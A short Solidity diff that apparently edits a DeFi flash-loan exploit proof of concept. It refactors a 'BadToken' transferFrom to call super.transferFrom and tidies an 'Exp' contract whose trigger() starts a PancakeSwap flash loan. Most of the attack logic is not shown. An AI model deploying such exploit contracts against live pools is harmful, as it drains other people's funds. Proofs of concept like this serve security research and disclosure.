@@ -68,9 +68,7 @@ contract BadToken is ERC20("", "") {
       );
     }
 
-    _spendAllowance(from, msg.sender, value);
-    _transfer(from, to, value);
-    return true;
+    return super.transferFrom(from, to, value);
   }
 
   function withdrawLiquidity() external {
@@ -119,7 +117,6 @@ contract Exp is IPancakeCallee {
 
   function trigger() external {
     _flashloan();
-
   }
 
   function pancakeCall(
